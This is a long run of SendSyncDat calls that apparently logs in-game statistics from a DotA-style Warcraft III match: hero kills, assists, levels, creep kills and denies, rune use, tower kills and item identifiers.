	SendSyncDat("dr.x", "Data", "PUI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "Hero5", 9);
	SendSyncDat("dr.x", "Data", "Assist7", 5);
	SendSyncDat("dr.x", "Data", "Assist11", 5);
	SendSyncDat("dr.x", "Data", "Level11", 9);
	SendSyncDat("dr.x", "Data", "Hero3", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 3);
	SendSyncDat("dr.x", "Data", "Assist11", 3);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "Hero4", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 4);
	SendSyncDat("dr.x", "Data", "Assist11", 4);
	SendSyncDat("dr.x", "Data", "Level15", 7);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227895890);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899225);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227894863);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Level12", 2);
	SendSyncDat("dr.x", "Data", "Level12", 10);
	SendSyncDat("dr.x", "Data", "RuneUse1", 7);
	SendSyncDat("dr.x", "Data", "PUI_7", 0);
	SendSyncDat("dr.x", "Data", "DRI_7", 0);
	SendSyncDat("dr.x", "Data", "PUI_7", 0);
	SendSyncDat("dr.x", "Data", "DRI_7", 0);
	SendSyncDat("dr.x", "Data", "Tower011", 9);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227895896);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227899192);
	SendSyncDat("dr.x", "Data", "CSK1", 36);
	SendSyncDat("dr.x", "Data", "CSD1", 5);
	SendSyncDat("dr.x", "Data", "NK1", 0);
	SendSyncDat("dr.x", "Data", "CSK7", 79);
	SendSyncDat("dr.x", "Data", "CSD7", 5);
	SendSyncDat("dr.x", "Data", "NK7", 7);
	SendSyncDat("dr.x", "Data", "CSK2", 88);
	SendSyncDat("dr.x", "Data", "CSD2", 8);
	SendSyncDat("dr.x", "Data", "NK2", 13);
	SendSyncDat("dr.x", "Data", "CSK8", 64);
	SendSyncDat("dr.x", "Data", "CSD8", 2);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 55);
	SendSyncDat("dr.x", "Data", "CSD3", 7);
	SendSyncDat("dr.x", "Data", "NK3", 3);
	SendSyncDat("dr.x", "Data", "CSK9", 48);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 3);
	SendSyncDat("dr.x", "Data", "CSK4", 15);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 37);
	SendSyncDat("dr.x", "Data", "CSK10", 24);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 43);
	SendSyncDat("dr.x", "Data", "CSD5", 6);
	SendSyncDat("dr.x", "Data", "NK5", 2);
	SendSyncDat("dr.x", "Data", "CSK11", 38);
	SendSyncDat("dr.x", "Data", "CSD11", 3);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "RuneUse6", 11);
	SendSyncDat("dr.x", "Data", "Level12", 11);
	SendSyncDat("dr.x", "Data", "PUI_11", 0);
	SendSyncDat("dr.x", "Data", "DRI_11", 0);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895376);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895376);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "Level13", 2);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895864);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895864);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "Level13", 10);
	SendSyncDat("dr.x", "Data", "Level11", 3);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "Level16", 7);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "Hero1", 8);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "Hero5", 10);
	SendSyncDat("dr.x", "Data", "Assist8", 5);
	SendSyncDat("dr.x", "Data", "Level14", 8);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895859);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895859);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse4", 7);
	SendSyncDat("dr.x", "Data", "PUI_7", 0);
	SendSyncDat("dr.x", "Data", "DRI_7", 0);
	SendSyncDat("dr.x", "Data", "Level13", 11);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896116);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896116);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227902265);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896903);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896903);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "Level10", 1);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "Hero1", 11);
	SendSyncDat("dr.x", "Data", "Assist9", 1);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "Level17", 7);
	SendSyncDat("dr.x", "Data", "Hero2", 7);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "Level12", 9);
	SendSyncDat("dr.x", "Data", "Tower022", 10);
	SendSyncDat("dr.x", "Data", "Tower010", 7);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227896907);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227896907);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "CSK1", 41);
	SendSyncDat("dr.x", "Data", "CSD1", 5);
	SendSyncDat("dr.x", "Data", "NK1", 8);
	SendSyncDat("dr.x", "Data", "CSK7", 124);
	SendSyncDat("dr.x", "Data", "CSD7", 5);
	SendSyncDat("dr.x", "Data", "NK7", 24);
	SendSyncDat("dr.x", "Data", "CSK2", 90);
	SendSyncDat("dr.x", "Data", "CSD2", 8);
	SendSyncDat("dr.x", "Data", "NK2", 22);
	SendSyncDat("dr.x", "Data", "CSK8", 73);
	SendSyncDat("dr.x", "Data", "CSD8", 2);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 63);
	SendSyncDat("dr.x", "Data", "CSD3", 7);
	SendSyncDat("dr.x", "Data", "NK3", 3);
	SendSyncDat("dr.x", "Data", "CSK9", 60);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 11);
	SendSyncDat("dr.x", "Data", "CSK4", 15);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 37);
	SendSyncDat("dr.x", "Data", "CSK10", 30);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 43);
	SendSyncDat("dr.x", "Data", "CSD5", 6);
	SendSyncDat("dr.x", "Data", "NK5", 4);
	SendSyncDat("dr.x", "Data", "CSK11", 49);
	SendSyncDat("dr.x", "Data", "CSD11", 4);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895874);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895874);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895890);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895890);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895874);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895890);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896115);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227897137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "Hero1", 8);
	SendSyncDat("dr.x", "Data", "Assist11", 1);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "Level14", 11);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "Level14", 10);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "Level15", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "Level13", 5);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "RuneUse2", 10);
	SendSyncDat("dr.x", "Data", "PUI_10", 0);
	SendSyncDat("dr.x", "Data", "DRI_10", 0);
	SendSyncDat("dr.x", "Data", "PUI_10", 0);
	SendSyncDat("dr.x", "Data", "DRI_10", 0);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227902791);
	SendSyncDat("dr.x", "Data", "Level18", 7);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895892);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895892);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895892);
	SendSyncDat("dr.x", "Data", "Hero5", 11);
	SendSyncDat("dr.x", "Data", "Assist7", 5);
	SendSyncDat("dr.x", "Data", "Hero2", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 2);
	SendSyncDat("dr.x", "Data", "Assist9", 2);
	SendSyncDat("dr.x", "Data", "Level19", 7);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227902512);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227901494);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227903809);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896113);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896113);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896903);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227897158);
	SendSyncDat("dr.x", "Data", "Level13", 9);
	SendSyncDat("dr.x", "Data", "Level15", 11);
	SendSyncDat("dr.x", "Data", "Hero3", 10);
	SendSyncDat("dr.x", "Data", "Assist7", 3);
	SendSyncDat("dr.x", "Data", "Assist8", 3);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "Tower020", 11);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "Courier1", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "RuneStore5", 8);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896116);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896116);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "Level14", 2);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895892);
	SendSyncDat("dr.x", "Data", "Level16", 8);
	SendSyncDat("dr.x", "Data", "Hero2", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 2);
	SendSyncDat("dr.x", "Data", "Level20", 7);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895887);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895887);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895859);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895887);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896400);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896904);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900994);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227903818);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227903818);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227903818);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900994);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900994);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227900994);
	SendSyncDat("dr.x", "Data", "Tower021", 10);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227900744);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "CSK1", 41);
	SendSyncDat("dr.x", "Data", "CSD1", 5);
